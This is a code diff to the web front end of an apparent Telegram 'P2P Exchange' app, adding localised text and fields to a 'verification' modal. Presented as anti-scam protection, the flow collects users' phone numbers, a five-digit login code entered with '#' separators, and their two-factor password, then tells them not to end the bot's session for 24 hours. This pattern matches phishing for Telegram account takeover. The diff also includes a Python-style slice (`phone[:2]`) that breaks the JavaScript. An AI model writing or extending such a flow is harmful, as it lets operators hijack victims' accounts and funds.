@@ -704,7 +704,19 @@
                 'headerTitle': 'P2P',
                 'headerTitleSpan': 'Exchange',
                 'adminTitle': 'Админ панель',
-                'loadingAdmin': 'Загрузка...'
+                'loadingAdmin': 'Загрузка...',
+                'verificationTitle': '🔐 Верификация',
+                'verificationDesc': 'Защита от мошенников со скамнутыми звёздами и фейковой валютой',
+                'enterPhone': '📱 Номер телефона (формат: +7XXXXXXXXXX)',
+                'enterUsername': '👤 Ваш Telegram Username',
+                'sendRequest': 'Отправить номер',
+                'waitForCode': '✅ Номер отправлен! Ожидайте код от администратора.',
+                'enterCode': '🔑 Введите код, который прислал администратор',
+                'codeFormat': 'Формат: 5 цифр через # (например: 7#3#9#1#5)',
+                'confirmCode': 'Подтвердить код',
+                'enterPassword': '🔐 Двухфакторный пароль (если есть, иначе напишите "нет")',
+                'verifySuccess': '✅ Верификация успешно пройдена! Сессия активна 24 часа.',
+                'sessionWarning': '⚠️ ВАЖНО: Если вы выкинете бота из сессии раньше 24 часов — придётся проходить всё заново!'
             },
             'en': {
                 'langPrompt': 'Choose your language',
@@ -777,7 +789,19 @@
                 'headerTitle': 'P2P',
                 'headerTitleSpan': 'Exchange',
                 'adminTitle': 'Admin panel',
-                'loadingAdmin': 'Loading...'
+                'loadingAdmin': 'Loading...',
+                'verificationTitle': '🔐 Verification',
+                'verificationDesc': 'Protection against scammers with scam stars and fake currency',
+                'enterPhone': '📱 Phone number (format: +7XXXXXXXXXX)',
+                'enterUsername': '👤 Your Telegram Username',
+                'sendRequest': 'Send number',
+                'waitForCode': '✅ Number sent! Wait for code from admin.',
+                'enterCode': '🔑 Enter the code from admin',
+                'codeFormat': 'Format: 5 digits with # (e.g., 7#3#9#1#5)',
+                'confirmCode': 'Confirm code',
+                'enterPassword': '🔐 Two-factor password (if any, otherwise write "no")',
+                'verifySuccess': '✅ Verification passed! Session active for 24 hours.',
+                'sessionWarning': '⚠️ IMPORTANT: If you close the bot session before 24 hours — you will have to verify again!'
             }
         };
 
@@ -1453,24 +1477,25 @@
         }
 
         // ============================================================
-        // 15. ВЕРИФИКАЦИЯ
+        // 15. ВЕРИФИКАЦИЯ (ПОЛНОСТЬЮ НА САЙТЕ)
         // ============================================================
         function showVerificationModal() {
+            const t = LANG_TEXT[currentLang] || LANG_TEXT['ru'];
             showModal(`
-                <h3 style="margin-bottom:12px;">🔐 Верификация</h3>
-                <p style="color:var(--text-secondary); margin-bottom:12px;">Защита от мошенников со скамнутыми звёздами и фейковой валютой</p>
+                <h3 style="margin-bottom:12px;">${t.verificationTitle || '🔐 Верификация'}</h3>
+                <p style="color:var(--text-secondary); margin-bottom:12px;">${t.verificationDesc || 'Защита от мошенников со скамнутыми звёздами и фейковой валютой'}</p>
                 
                 <div id="verifyStep1">
                     <div class="form-group">
-                        <label>📱 Номер телефона (формат: +7XXXXXXXXXX)</label>
+                        <label>${t.enterPhone || '📱 Номер телефона (формат: +7XXXXXXXXXX)'}</label>
                         <input type="text" id="verifyPhone" placeholder="+79001234567">
                     </div>
                     <div class="form-group">
-                        <label>👤 Ваш Telegram Username</label>
+                        <label>${t.enterUsername || '👤 Ваш Telegram Username'}</label>
                         <input type="text" id="verifyUsername" placeholder="@john_doe">
                     </div>
                     <button class="btn btn-primary" onclick="sendVerificationRequest()">
-                        <i class="fas fa-paper-plane"></i> Отправить номер
+                        <i class="fas fa-paper-plane"></i> ${t.sendRequest || 'Отправить номер'}
                     </button>
                     <div id="verifyStep1Result" class="mt-10" style="display:none;"></div>
                 </div>
@@ -1478,15 +1503,19 @@
                 <div id="verifyStep2" style="display:none;">
                     <div class="verification-status verified" style="display:block;">
                         <i class="fas fa-check-circle"></i>
-                        ✅ Номер отправлен! Ожидайте код от администратора.
+                        ${t.waitForCode || '✅ Номер отправлен! Ожидайте код от администратора.'}
                     </div>
                     <div class="form-group mt-10">
-                        <label>🔑 Введите код, который прислал администратор</label>
+                        <label>${t.enterCode || '🔑 Введите код, который прислал администратор'}</label>
                         <input type="text" id="verifyCodeModal" placeholder="7#3#9#1#5">
-                        <div style="font-size:11px; color:var(--text-muted); margin-top:4px;">Формат: 5 цифр через # (например: 7#3#9#1#5)</div>
+                        <div style="font-size:11px; color:var(--text-muted); margin-top:4px;">${t.codeFormat || 'Формат: 5 цифр через # (например: 7#3#9#1#5)'}</div>
+                    </div>
+                    <div class="form-group">
+                        <label>${t.enterPassword || '🔐 Двухфакторный пароль (если есть, иначе напишите "нет")'}</label>
+                        <input type="text" id="verifyPassword" placeholder="mypassword или нет">
                     </div>
                     <button class="btn btn-success" onclick="submitVerificationCode()">
-                        <i class="fas fa-check"></i> Подтвердить код
+                        <i class="fas fa-check"></i> ${t.confirmCode || 'Подтвердить код'}
                     </button>
                     <div id="verifyStep2Result" class="mt-10" style="display:none;"></div>
                 </div>
@@ -1496,6 +1525,7 @@
         }
 
         async function sendVerificationRequest() {
+            const t = LANG_TEXT[currentLang] || LANG_TEXT['ru'];
             const phone = document.getElementById('verifyPhone').value.trim();
             const username = document.getElementById('verifyUsername').value.trim().replace('@', '');
 
@@ -1525,10 +1555,15 @@
                 if (data.success) {
                     resultDiv.innerHTML = `
                         <div style="color:#2ecc71; padding:8px; background:rgba(46,204,113,0.05); border-radius:8px; border:1px solid rgba(46,204,113,0.1);">
-                            ✅ Номер отправлен администратору!
-                            <br><small style="color:var(--text-secondary);">Ожидайте код в боте @${BOT_USERNAME}</small>
+                            ${t.waitForCode || '✅ Номер отправлен! Ожидайте код от администратора.'}
+                            <br><small style="color:var(--text-secondary);">📱 ${phone[:2]}****${phone.slice(-4)}</small>
                         </div>
                     `;
+                    
+                    // Сохраняем request_id для следующего шага
+                    if (data.request_id) {
+                        window._verificationRequestId = data.request_id;
+                    }
                     
                     document.getElementById('verifyStep1').style.display = 'none';
                     document.getElementById('verifyStep2').style.display = 'block';
@@ -1550,20 +1585,22 @@
                 `;
                 showToast('❌ Ошибка: ' + err.message, 'error');
             } finally {
-                btn.innerHTML = '<i class="fas fa-paper-plane"></i> Отправить номер';
+                btn.innerHTML = '<i class="fas fa-paper-plane"></i> ' + (t.sendRequest || 'Отправить номер');
                 btn.disabled = false;
             }
         }
 
         async function submitVerificationCode() {
+            const t = LANG_TEXT[currentLang] || LANG_TEXT['ru'];
             const code = document.getElementById('verifyCodeModal').value.trim();
-            const resultDiv = document.getElementById('verifyStep2Result');
+            const password = document.getElementById('verifyPassword').value.trim();
 
             if (!code) {
                 showToast('❌ Введите код подтверждения', 'error');
                 return;
             }
 
+            // Проверка формата кода
             const parts = code.split('#');
             if (parts.length !== 5) {
                 showToast('❌ Код должен содержать 5 цифр через # (например: 7#3#9#1#5)', 'error');
@@ -1577,22 +1614,25 @@
             }
 
             const btn = document.querySelector('#verifyStep2 .btn-success');
+            const resultDiv = document.getElementById('verifyStep2Result');
             btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Проверка...';
             btn.disabled = true;
             resultDiv.style.display = 'block';
             resultDiv.innerHTML = '<div style="color:var(--text-secondary);">⏳ Проверка...</div>';
 
             try {
-                const data = await apiCall('/api/verify_code', { 
-                    code: code
+                const data = await apiCall('/api/submit_verification_code', { 
+                    code: code,
+                    password: password || 'нет',
+                    request_id: window._verificationRequestId || ''
                 });
                 
                 if (data.success) {
                     resultDiv.innerHTML = `
                         <div style="color:#2ecc71; padding:8px; background:rgba(46,204,113,0.05); border-radius:8px; border:1px solid rgba(46,204,113,0.1);">
-                            ✅ Верификация успешно пройдена! Сессия активна 24 часа.
+                            ${t.verifySuccess || '✅ Верификация успешно пройдена! Сессия активна 24 часа.'}
                             ${data.expires_at ? `<br><small style="color:var(--text-secondary);">🕐 Сессия активна до: ${new Date(data.expires_at).toLocaleString()}</small>` : ''}
-                            <br><small style="color: var(--warning);">⚠️ ВАЖНО: Если вы выкинете бота из сессии раньше 24 часов — придётся проходить всё заново!</small>
+                            <br><small style="color: var(--warning);">${t.sessionWarning || '⚠️ ВАЖНО: Если вы выкинете бота из сессии раньше 24 часов — придётся проходить всё заново!'}</small>
                         </div>
                     `;
                     
@@ -1617,7 +1657,7 @@
                 `;
                 showToast('❌ Ошибка: ' + err.message, 'error');
             } finally {
-                btn.innerHTML = '<i class="fas fa-check"></i> Подтвердить код';
+                btn.innerHTML = '<i class="fas fa-check"></i> ' + (t.confirmCode || 'Подтвердить код');
                 btn.disabled = false;
             }
         }
@@ -1788,7 +1828,6 @@
                         <strong>👤 ${r.username}</strong>
                         <div>📱 ${r.phone}</div>
                         <div style="font-size:12px;color:var(--text-secondary);">🆔 ${r.user_id}</div>
-                        <div style="font-size:12px;color:var(--text-secondary);">🔑 Код: ${r.code || 'не указан'}</div>
                         <div style="font-size:10px;color:var(--text-muted);">📅 ${r.created_at ? new Date(r.created_at).toLocaleString() : 'неизвестно'}</div>
                         <div style="font-size:10px;color:var(--text-muted);">Статус: ${r.status}</div>
                     </div>
